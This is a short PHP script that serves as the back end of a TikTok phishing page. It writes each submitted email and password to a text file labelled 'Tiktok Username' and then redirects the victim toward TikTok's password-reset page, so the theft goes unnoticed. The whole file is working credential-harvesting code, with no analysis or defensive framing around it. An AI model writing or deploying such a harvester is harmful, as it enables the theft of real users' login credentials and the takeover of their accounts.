<?php

file_put_contents("usernames.txt", "Tiktok Username: " . $_POST['email'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.tiktok.com/login/email/forget-password
header("Location: $url");
exit();
?>